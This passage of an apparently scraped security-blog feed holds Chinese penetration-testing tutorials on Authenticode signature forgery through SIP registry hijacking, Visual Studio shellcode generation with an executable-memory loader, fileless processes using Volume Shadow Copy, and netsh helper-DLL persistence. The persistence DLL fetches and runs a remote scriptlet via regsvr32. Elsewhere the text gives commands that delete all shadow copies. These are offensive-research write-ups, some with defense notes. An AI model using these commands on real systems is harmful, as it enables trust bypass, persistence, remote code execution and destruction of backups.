0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f 重启explorer.exe，所有的exe文件都包含hash为：018B222E21FBB2952304D04D1D87F736ED46DEA4的签名 特别的地方：伪造的签名来自于cat文件，但是会以Authenticode签名的格式显示，通过文件属性能够看到签名信息(这是Authenticode签名的特性，catalog签名不具有该特性) 同样，修改原工程能够实现针对特定PE文件的签名伪造，方法不再赘述 0x04 针对cat文件的签名伪造方法 如果对所有.cat文件的签名验证过程进行替换，再将其添加到安全编录数据库中，那么，包含catalog签名的PE文件是否也随即获得伪造签名呢？ 下面开始测试： 新建文本文档cat.txt，内容如下： [CatalogHeader] Name=makecat1.cat [CatalogFiles] &lt;hash&gt;ExeFile1=mimikatz.exe 注： txt文件尾部需要一个空行，否则，在接下来的操作会报错，提示文件无法找到 使用makecat.exe生成makecat1.cat： makecat -v cat.txt 为makecat1.cat添加伪造的Authenticode签名： signtool sign /f certtest.pfx /p 123456 makecat1.cat 注： certtest.pfx不能使用之前手动生成的证书，不能加参数： -eku 1.3.6.1.5.5.7.3.3，否则exe文件的catalog签名将会校验失败 生成certtest.pfx的操作如下： makecert -n &quot;CN=Microsoft Windows Test1&quot; -r -sv certtest.pvk certtest.cer cert2spc certtest.cer certtest.spc pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f 此处还需要将证书安装到“受信任的根证书颁发机构”存储区 管理员权限： certmgr.exe -add -c certtest.cer -s -r localmachine root 否则，之后的签名验证会报错，提示证书链不可信 补充： 从“受信任的根证书颁发机构”存储区删除证书的操作为： (管理员权限) certmgr.exe -del -c -n &quot;Windows Test1&quot; -s -r localMachine Root cat文件对应GUID:DE351A43-8E59-11D0-8C47-00C04FC295EE 替换注册表键值： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;AutoApproveHash&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\MySIP.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;GetLegitMSSignature&quot; /f 重启explorer.exe，所有的cat文件签名均为Microsoft Windows 将makecat1.cat添加到系统的安全编录数据库： (管理员权限) signtool catdb -v makecat1.cat 最终，发现文件的catalog签名保持不变，无法进行伪造 得出结论： 这种方式无法对catalog签名进行伪造 0x05 小结 本文介绍了Authenticode签名伪造的另一种利用方法：通过修改系统的签名获取机制，欺骗系统将正常文件识别为包含签名数据。 经过这两篇文章的测试，得出最终结论：应谨慎对待系统的Authenticode签名，因为通过修改注册表或dll劫持等方式均能够伪造出微软签名，对此，白名单等防御机制不应盲目相信Authenticode签名过的文件。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Authenticode签名伪造——PE文件的签名伪造与签名验证劫持]]></title>
    <url>%2Fposts%2F7138bc2f.html</url>
    <content type="text"><![CDATA[0x00 前言 在上一篇文章《CAT文件数字签名使用技巧》介绍了证书签名的基础知识，Windows系统下向文件签名有两种方法：添加在文件末尾(Authenticode)和CAT文件(catalog)，本文将介绍Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持 注： 本文介绍的技巧参考自Matt Graeber@mattifestation公开的资料，本文将结合自己的经验，整理相关内容，添加个人理解。 参考资料： https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view 0x01 简介 本文将要介绍以下内容： PE文件的Authenticode签名伪造 劫持签名验证过程，实现代码执行，作为后门 0x02 PE文件的签名伪造 Authenticode的详细说明文档可参考： http://download.microsoft.com/download/9/c/5/9c5b2167-8017-4bae-9fde-d599bac8184a/Authenticode_PE.docx 部分系统文件会包含微软的签名，例如C:\Windows\System32\consent.exe 通过文件属性能够看到相关签名信息，如下图 通过powershell验证，代码如下： Get-AuthenticodeSignature C:\Windows\System32\consent.exe 如下图 借助工具CFF Explorer获取文件结构，如下图 Security Directory RVA代码数字签名在PE文件中的偏移位置Security DirectorySize代表数字签名的长度 将这部分内容提取，复制到另一个文件test.exe的尾部，同时使用CFF Explorer修改test.exe对应的Security Directory RVA和Security DirectorySize 这样，就实现了数字签名的伪造 开源工具SigThief可自动实现以上过程，地址如下： https://github.com/secretsquirrel/SigThief 实际测试：测试系统： Win7 将C:\Windows\System32\consent.exe的数字签名复制到mimikatz.exe中 参数如下： sigthief.py -i C:\Windows\System32\consent.exe -t mimikatz.exe -o si.exe 生成si.exe，具有微软数字签名，但提示证书无效，如下图 注： 部分测试系统无法使用sigthief.py，提示找不到0x9，将系统激活即可 通过powershell验证，代码如下： Get-AuthenticodeSignature .\si.exe 显示HashMismatch，如下图 通过signtool.exe验证： signtool.exe verify /v si.exe 显示SignTool Error: WinVerifyTrust returned error: 0x80096010，如下图 通过sigcheck.exe验证： sigcheck.exe -q si.exe 显示The digital signature of the object did not verify，如下图 0x03 修改配置，使签名通过验证 查看Get-AuthenticodeSignature的帮助说明： Get-Help Get-AuthenticodeSignature -Full 查看相关操作Set-AuthenticodeSignature的帮助说明： Get-Help Set-AuthenticodeSignature -Full 发现该命令的功能： The Set-AuthenticodeSignature cmdlet adds an Authenticode signature toany file that supports Subject Interface Package (SIP). 关于SIP的资料，可参考： https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/ 获得有用的信息： There are some included as part of the OS (at least on Vista). Locatein the %WINDIR%\System32 directory. They usually have a naming endingwith sip.dll, i.e. msisip.dll is the Microsoft Installer (.msi) SIP. 寻找Windows下的SIP: ls C:\Windows\System32\*sip.dll -Recurse -ErrorAction SilentlyContinue Win7下只有一个：C:\Windows\System32\msisip.dll 注： Matt Graeber的测试系统为Win10，可以找到多个dll 使用IDA打开该dll，查看函数DllRegisterServer() 如下图 找到一个特别的名称MsiSIPVerifyIndirectData，字面意思像是签名验证功能 查找资料，找到该函数，地址如下： https://msdn.microsoft.com/en-us/library/windows/desktop/cc542591%28v=vs.85%29.aspx 发现该函数，返回TRUE代表验证成功，返回FALSE代表验证失败 该功能对应注册表键值，位置如下： HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\ 如下图 不同GUID对应不同文件格式的验证，例如： C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog .cat文件 9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctl文件 C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cab文件 注： GUID说明引用自《Subverting Trust in Windows》 Page4 接下来，尝试替换HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}下的dll和FuncName 通过c++实现，创建dll，添加导出函数，格式参照CryptSIPVerifyIndirectData，代码如下： BOOL WINAPI CryptSIPVerifyIndirectData(SIP_SUBJECTINFO *pSubjectInfo, SIP_INDIRECT_DATA *pIndirectData) { return TRUE; } 编译生成signtest.dll 修改注册表： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\signtest.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;CryptSIPVerifyIndirectData&quot; /f 重新启动cmd，使用powershell进行验证： Get-AuthenticodeSignature .\si.exe 显示Valid，校验成功 如下图 通过signtool.exe验证： signtool.exe verify /v si.exe 验证通过 通过sigcheck.exe验证： sigcheck.exe -q si.exe 验证通过，如下图 重启explorer.exe，查看文件属性，签名状态，显示签名生效，如下图 更进一步，dll一定要固定格式吗？ 于是进行接下来的测试： 导出函数名为test1，完整代码如下： BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { return TRUE; } BOOL WINAPI test1() { return TRUE; } 修改对应注册表键值： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\test\signtest.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;test1&quot; /f 测试仍能够绕过验证 这就说明，只要dll的导出函数返回TRUE，就能够绕过验证 所以，可以查找系统默认的dll，找到一个导出函数返回true即可（当然，此处可供利用的导出函数有很多） 例如&quot;C:\Windows\System32\ntdll.dll&quot; 导出函数：DbgUiContinue 代码如下： REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\Windows\System32\ntdll.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;DbgUiContinue&quot; /f 这样，就不需要在系统上留下自己编写的dll 对于64位系统，存在32位的注册表键值 如果使用32位的程序，如32位的signtool和sigcheck，为了绕过验证，还需要修改32位的注册表键值，对应代码如下： REG ADD &quot;HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\Windows\System32\ntdll.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Wow6432Node\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;DbgUiContinue&quot; /f 0x04 签名验证劫持 修改注册表，编写dll实现对签名验证过程的绕过，如果我们在dll的导出函数里面加入自己的代码，这就实现了签名验证劫持 在签名验证中加入执行代码： BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { return TRUE; } BOOL WINAPI test1() { WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL); return TRUE; } 只要涉及签名验证的操作，加载我们自己的dll，就会弹出计算器 以下程序会使用签名验证操作： DllHost.exe - When the “Digital Signatures” tab is displayed in file properties Process Explorer - When the “Verified Signer” tab is displayed Autoruns Sigcheck consent.exe - Any time a UAC prompt is displayed signtool.exe smartscreen.exe Get-AuthenticodeSignature Set-AuthenticodeSignature Security vendor software that performs certificate validation based on calls to WinVerifyTrust. 注： 该处引用自《Subverting Trust in Windows》 Page33 例如，查看文件属性-数字签名详细信息，加载dll，弹出计算器，如下图 特别的，以管理员权限执行程序会弹出UAC，如果对此进行劫持，此时的权限为system 完整操作如下图 补充：1、dll劫持 有些GUID，默认注册表的dll路径为相对路径，这里就存在dll劫持的问题，不需要修改注册表也能实现绕过签名验证 2、Hiding from Autoruns 启动项检测工具Autoruns默认不显示带有微软签名的文件，如下图 如果文件包含微软签名，默认不会显示在Autoruns面板 0x05 防御建议 部分白名单程序默认会信任带有微软证书的文件，这里就存在隐患 建议不要盲目相信证书 0x06 小结 本文介绍了Authenticode签名的相关利用技巧——PE文件的签名伪造与签名验证劫持，下一篇文章将继续介绍Authenticode签名的伪造技巧——针对文件类型的签名伪造。 最后感谢Matt Graeber的分享。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——通过VisualStudio生成shellcode]]></title>
    <url>%2Fposts%2F8e0a809e.html</url>
    <content type="text"><![CDATA[0x00 前言 shellcode是一段机器码，常用作漏洞利用中的载荷(也就是payload) 在渗透测试中，最简单高效的方式是通过metasploit生成shellcode，然而在某些环境下，需要定制开发自己的shellcode，所以需要对shellcode的开发作进一步研究 0x01 简介 编写Shellcode的基本方式有3种： 直接编写十六进制操作码 采用C或者Delphi这种高级语言编写程序，编译后，对其反汇编进而获得十六进制操作码 编写汇编程序，将该程序汇编，然后从二进制中提取十六进制操作码 本文将介绍如何通过Visual Studio编写c代码来生成shellcode，具体包含以下三部分内容： 利用vc6.0的DEBUG模式获取shellcode 测试Shellcode自动生成工具——ShellcodeCompiler 使用C++编写(不使用内联汇编)，实现动态获取API地址并调用，对其反汇编可提取出shellcode 0x02 利用vc6.0的DEBUG模式获取shellcode 注： 本节参考爱无言的《挖0day》附录部分 测试系统： Windows XP 1、编写弹框测试程序并提取汇编代码代码如下： #include &quot;stdafx.h&quot; #include &lt;windows.h&gt; int main(int argc, char* argv[]) { MessageBoxA(NULL,NULL,NULL,0); return 0; } 在MessageBoxA(NULL,NULL,NULL,0);处，按F9下断点 debug模式按F5开始调试，跳到断点 按Alt+8将当前C代码转为汇编代码,如图 00401028 mov esi,esp 0040102A push 0 0040102C push 0 0040102E push 0 00401030 push 0 00401032 call dword ptr [__imp__MessageBoxA@16 (0042528c)] call是一条间接内存调用指令，实际使用需要真正的内存地址 按Alt+6打开查看内存数据的Memory窗口，跳到位置0x0042528c，如图 0042528C EA 07 D5 77 00 00 00 ..誻... 取前4字节，倒序排列(内存中数据倒着保存):77D507EA call命令的实际地址为0x77D507EA MessageBoxA函数位于user32.dll中，调用时需要提前加载user32.dll 2、编写内联汇编程序并提取机器码新建工程，使用内联汇编加载上述代码： #include &quot;stdafx.h&quot; #include &lt;windows.h&gt; int main(int argc, char* argv[]) { LoadLibrary(&quot;user32.dll&quot;); _asm { push 0 push 0 push 0 push 0 mov eax,0x77D507EA call eax } return 0; } 编译执行，成功弹框 在push 0处按F9下断点，F5进入调试模式跳至断点处 按Alt+8将当前VC代码转为汇编代码，如图 12: push 0 0040103C push 0 13: push 0 0040103E push 0 14: push 0 00401040 push 0 15: push 0 00401042 push 0 16: mov eax,0x77D507EA 00401044 mov eax,77D507EAh 17: call eax 00401049 call eax 接着提取上述代码在内存中的数据，如图 范围是0040103C - 0040104A 注： call eax的地址为00401049，表示起始地址，完整代码的长度需要+1 按Alt+6打开查看内存数据的Memory窗口 跳到0x0040103C，内容如下： 0040103C 6A 00 6A 00 6A 00 6A 00 B8 EA 07 D5 77 FF D0 j.j.j.j.戈.誻.. 截取0040103C - 0040104A的内容如下： 6A 00 6A 00 6A 00 6A 00 B8 EA 07 D5 77 FF D0 这段机器码就是接来下要使用的shellcode 3、编写加载shellcode的测试程序#include &quot;stdafx.h&quot; #include &lt;windows.h&gt; int main(int argc, char* argv[]) { LoadLibrary(&quot;user32.dll&quot;); char shellcode[]=&quot;\x6A\x00\x6A\x00\x6A\x00\x6A\x00\xB8\xEA\x07\xD5\x77\xFF\xD0&quot;; ((void(*)(void))&amp;shellcode)(); return 0; } 成功执行shellcode 注： 由于Win7系统引入了ASLR机制，因此我们不能在shellcode中使用固定的内存地址，上述方法在Win7下不通用 0x03 Shellcode自动生成工具——ShellcodeCompiler 下载地址： https://github.com/NytroRST/ShellcodeCompiler 特点： c++开发 开源工具 借助NASM 可实现封装api，转换为bin格式的shellcode和asm汇编代码 实际测试： Source.txt内容如下： function MessageBoxA(&quot;user32.dll&quot;); function ExitProcess(&quot;kernel32.dll&quot;); MessageBoxA(0,&quot;This is a MessageBox example&quot;,&quot;Shellcode Compiler&quot;,0); ExitProcess(0); cmd下运行： ShellcodeCompiler.exe -r Source.txt -o Shellcode.bin -a Assembly.asm 注： ShellcodeCompiler.exe和文件夹NASM放于同级目录 执行后shellcode保存在Shellcode.bin文件中 为便于测试生成的shellcode，可在生成过程中加入-t参数执行一次shellcode 我参考ShellcodeCompiler的代码将其执行shellcode的功能提取出来，实现了读取文件并加载文件中的shellcode，完整代码如下： #include &lt;windows.h&gt; size_t GetSize(char * szFilePath) { size_t size; FILE* f = fopen(szFilePath, &quot;rb&quot;); fseek(f, 0, SEEK_END); size = ftell(f); rewind(f); fclose(f); return size; } unsigned char* ReadBinaryFile(char *szFilePath, size_t *size) { unsigned char *p = NULL; FILE* f = NULL; size_t res = 0; // Get size and allocate space *size = GetSize(szFilePath); if (*size == 0) return NULL; f = fopen(szFilePath, &quot;rb&quot;); if (f == NULL) { printf(&quot;Binary file does not exists!\n&quot;); return 0; } p = new unsigned char[*size]; // Read file rewind(f); res = fread(p, sizeof(unsigned char), *size, f); fclose(f); if (res == 0) { delete[] p; return NULL; } return p; } int main(int argc, char* argv[]) { char *szFilePath=argv[1]; unsigned char *BinData = NULL; size_t size = 0; BinData = ReadBinaryFile(szFilePath, &amp;size); void *sc = VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (sc == NULL) { return 0; } memcpy(sc, BinData, size); (*(int(*)()) sc)(); return 0; } 0x04 C++编写(不使用内联汇编)，实现动态获取API地址并调用，对其反汇编可提取出shellcode 对于ShellcodeCompiler，最大的不足是使用了内联汇编，vc在64位下默认不支持内联汇编，所以该方法无法生成64位shellcode 注： delphi支持64位的内联汇编 vc在64位下虽然不能直接使用内联汇编，但是可以将程序段全部放到一个asm文件下进行编译 X64上恢复VS关键字__asm的方法可参照： http://bbs.pediy.com/showthread.php?p=1260419 那么，想要开发一个64位的shellcode，最直接的方式就是不使用内联汇编，纯c++编写，实现动态获取API地址并调用，最后对其反汇编进而得到shellcode 好处如下： 便于调试，源代码的可读性大大增强 但是，我在网上并没有找到现成的代码，于是根据原理尝试自己实现 注： 1、编写shellcode需要实现以下步骤： 获取kernel32.dll基地址 定位GetProcAddress函数地址 使用GetProcAddress确定LoadLibrary函数地址 使用LoadLibrary加载DLL文件 使用GetProcAddress查找某个函数的地址（例如MessageBox） 指定函数参数 调用函数 2、另一个参考资料： http://bbs.pediy.com/showthread.php?t=203140 参考资料通过c++实现了加载一个第三方dll 以此为参考进行修改，实现我们想要的功能： 实现动态获取API地址并调用 完整代码已上传至github： https://github.com/3gstudent/Shellcode-Generater 特点： 支持x86和x64 纯c++实现，动态获取GetProcAddress和LoadLibrary函数的地址 编译前对VisualStudio做如下配置： 1、使用Release模式。近来编译器的Debug模式可能产生逆序的函数，并且会插入许多与位置相关的调用。 2、禁用优化。编译器会默认优化那些没有使用的函数，而那可能正是我们所需要的。 3、禁用栈缓冲区安全检查（/Gs)。在函数头尾所调用的栈检查函数，存在于二进制文件的某个特定位置，导致输出的函数不能重定位，这对shellcode是无意义的 接着在IDA下打开生成的exe获得机器码即可 0x05 补充 接下来研究的内容： 在X64上恢复VS关键字__asm后，如何获取64位shellcode LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透测试中的Volume Shadow Copy]]></title>
    <url>%2Fposts%2Fe653bd5d.html</url>
    <content type="text"><![CDATA[0x00 前言 之前在《导出当前域内所有用户hash的技术整理》中研究过如何通过Volume Shadow Copy实现对ntds.dit文件的复制， 可用来导出域内所有用户hash。而最近在Carbon Black的博客上面又学到了一些新的利用方法，于是整理成文。 学习链接： https://www.carbonblack.com/2015/08/05/bit9-carbon-black-threat-research-team-unveils-nefarious-intents-of-volume-shadows-copies/ 0x01 简介 本文将详细介绍以下两方面内容： 通过Volume Shadow Copy恢复系统自动还原点内保存的文件 通过Volume Shadow Copy创建一个无文件的进程 流程如下： 创建当前卷影镜像 启动镜像内的程序 删除卷影镜像文件 程序源文件被删除 该进程实现无文件 0x02 背景知识 Volume Shadow Copy Service 用于数据备份 支持Windows Server 2003 及以上操作系统 系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定 禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup 可使用VShadow在命令行下手动创建卷影镜像 系统默认不支持VShadow，可在Microsoft Windows Software Development Kit (SDK)中获得该工具 注： Windows Server 2003和XP系统需要Volume Shadow Copy Service SDK 7.2，下载地址如下： https://www.microsoft.com/en-us/download/details.aspx?id=23490 Windows Server 2008 R2和Windows 7系统需要对应的SDK版本(该版本Win8也适用)，下载地址如下： https://www.microsoft.com/en-us/download/details.aspx?id=3138 0x03 恢复系统自动还原点内保存的文件 常用命令通过vssadmin查看卷影镜像： vssadmin list shadows 注：vssadmin系统自带 如图 通过wmic查看卷影镜像： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ShadowCopy GET /all /FORMAT:list 如图 提取出关键的信息DeviceObject、ID和InstallDate，对应wmic命令如下： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list 如图 注： 在删除某个卷影镜像时需要填入该卷影镜像的ID 创建符号链接将卷影镜像和文件夹建立虚拟关联，类似于通过快捷方式可访问卷影镜像中保存的文件，使用mklink命令，系统自带，需要管理员权限格式如下： mklink /d 指定快捷方式路径 [Shadow copy device name]\ 注： [Shadow copy device name]后要带一个\如果不小心漏掉\,在建立关联后无法对其进行后续操作，可直接删除该关联再重新建立 例如，选取\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4，对应的命令如下： mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\ 如图，成功创建 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4对应的时间点为InstallDate=20160907160419.347805+480，于是c:\testvsc中保存的即为此时间点系统中保存的文件 0x04 创建一个无文件的进程 测试系统： Win 8.1 x86 测试exe： Win32Project1.exe 执行后弹框，如图 1. 创建卷影镜像上传Win32Project1.exe和VShadow.exe，为当前系统创建卷影镜像，管理员权限执行如下命令： vshadow.exe -p c:\ 如图，为C盘创建卷影镜像，DeviceName为\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5，ID为{10f63e0b-e47d-4121-969f-87fa458c5043} 2. 创建符号链接命令行执行： mklink /d c:\vscfiletest \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\ 创建文件夹c:\vscfiletest，执行其中的测试文件Win32Project1.exe如图 使用Process Explorer查看Win32Project1.exe，路径显示为c:\vscfiletest\test\Win32Project1.exe 如图 3. 删除符号链接删除快捷方式文件夹就好，命令行参数如下： rmdir c:\vscfiletest\ 注： 即使文件夹中的Win32Project1.exe正在运行，仍可删除 4、删除卷影镜像通过wmic找到卷影镜像对应的ID： wmic /NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\对应的ID为{10f63e0b-e47d-4121-969f-87fa458c5043} 完整的删除代码为： vssadmin delete shadows /shadow={10f63e0b-e47d-4121-969f-87fa458c5043} /quiet 注： 加入/quiet是为了强制删除，省去输入Y确认 如图 补充：删除所有卷影镜像的命令为： vssadmin delete shadows /all /quiet 此时，Win32Project1.exe仍在后台运行，而源文件c:\vscfiletest\test\Win32Project1.exe已经不存在 如图 0x05 防御 利用Volume Shadow Copy的前提是需要获得管理员权限，所以首先需要防止攻击者获得管理员权限 对于个人用户主机，建议直接禁用Volume Shadow Copy服务 Carbon Black的博客上面提供的防御方法如下： Search by hashes: process_md5:3e1360a23ea5f9caf4987ccf35f2fcaf ORprocess_md5:576b379a59d094fb7b06c261a96034a6 ORprocess_md5:d0cd7ad91b2ff568275d497214ff185c ORprocess_md5:97fd0f3c05f1707544a9a6a0c896b43e ORprocess_md5:d560c155b68121d98f8370e7deafbc4d ORprocess_md5:c5d2992c8cba0771f71fe4d7625a0b8b ORprocess_md5:53d3e33ad31af6716559f29e889aca49 Search for Vshadow being executed: modload:vss_ps.dll cmdline:”-p C:\” modload:vss_ps.dll cmdline:”-p” -path:System32\werfault.exe Search for mklink being executed via a shell out: cmdline:””C:\Windows\system32\cmd.exe” /c mklink /D” Search for processes being executed from the volume shadow copylocations: path:device/harddiskvolumeshadowcopy* path:device/harddiskvolume* 以上引用自https://www.carbonblack.com/2015/08/05/bit9-carbon-black-threat-research-team-unveils-nefarious-intents-of-volume-shadows-copies/ 0x06 小结 总结一下渗透测试中Volume Shadow Copy的作用： 通过Volume Shadow Copy恢复系统自动还原点内保存的文件 通过Volume Shadow Copy创建一个无文件的进程 复制正被程序占用的文件，如ntds.dit，当然powershell版的NinjaCopy也能实现相同的功能,可参照https://github.com/3gstudent/NinjaCopy 更多学习资料： https://www.carbonblack.com/2015/08/03/new-crypto-ransomware-lurks-in-the-shadows/http://securityweekly.com/2012/10/15/volume-shadow-copies-the-los/https://technet.microsoft.com/en-us/library/ee923636.aspx LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Netsh persistence]]></title>
    <url>%2Fposts%2F576f5bcd.html</url>
    <content type="text"><![CDATA[About: Common commands of netsh Matthew Demaske’s way of using netshell to execute evil dlls and persist on a host Write a dll with the InitHelperDll function How to use Detection 目录： 介绍netsh的常用命令 测试Matthew Demaske分享的方法——using netshell to execute evil dlls and persist on a host 如何使用c++编写导出函数为InitHelperDll的helper dll 实际测试利用 防御和检测 Reference: http://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/ 0x00 简介 在渗透测试中，使用系统中默认支持的命令常常可以绕过各种检测和拦截，比如我在《Use bitsadmin to maintain persistence and bypass Autoruns》中介绍过如何利用系统默认支持的bitsadmin来实现自启动，并绕过Autoruns的检测。 Matthew Demaske在最近分享了一个他发现的方法，同样是利用系统中默认支持的命令——using netshell to execute evil dlls and persist on a host，本文将对其方法进行整理，并补全文中未具体介绍的dll编写方法 0x01 netsh简介 是windows系统本身提供的功能强大的网络配置命令行工具，常用命令如下： 查看ip配置信息：netsh interface ip show config 查看网络配置文件：netsh -c interface dump 开/关网卡：netsh int set int name=&quot;ethernet&quot; admin=enablednetsh int set int name=&quot;ethernet&quot; admin=disabled 查看所有tcp连接：netsh interface ip show tcpconnections 设置本机ip、子网掩码、网关ip：netsh interface ip set address &quot;Local Area Connection&quot; static 192.168.1.2 255.255.255.0 192.168.1.1 查看防火墙状态：netsh firewall show state 开/关防火墙： netsh firewall set opmode enable netsh firewall set opmode disable 输入netsh /?可查看更详细的命令帮助，其中add命令值得注意，输入netsh add /?获得更详细内容： netsh add /? The following commands are available: Commands in this context: add helper - Installs a helper DLL. 如果在此添加一个测试dll，结果会怎样呢？ 0x02 编写helper DLL 每个helper DLL都需要包含导出函数InitHelperDll 在添加helper DLL后，每次netsh在初始加载的时候会调用该helper DLL中的导出函数InitHelperDll InitHelperDll示例如下： DWORD WINAPI InitHelperDll( DWORD dwNetshVersion, PVOID pReserved ) { NS_HELPER_ATTRIBUTES attMyAttributes; attMyAttributes.guidHelper = g_MyGuid; attMyAttributes.dwVersion = 1; attMyAttributes.pfnStart = NetshStartHelper; RegisterHelper( NULL, &amp;attMyAttributes ); return NO_ERROR; } 关于InitHelperDll的细节可参照如下链接： https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx 在《Code Execution of Regsvr32.exe》曾具体介绍过如何为dll添加一个导出函数，所以在这里接着简单介绍一下： 新建c++工程，创建一个dll项目 在主文件添加: DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved) { char *command=&quot;cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll&quot;; WinExec(command,SW_HIDE); return 0; } 添加导出函数声明: 文件类型： Text File 名称： 同名文件.def 写入 EXPORTSInitHelperDll 编译即可 注： Marc Smeets分享了他的POC代码，定义导出函数使用的是另一种方式: extern &quot;C&quot; __declspec(dllexport) 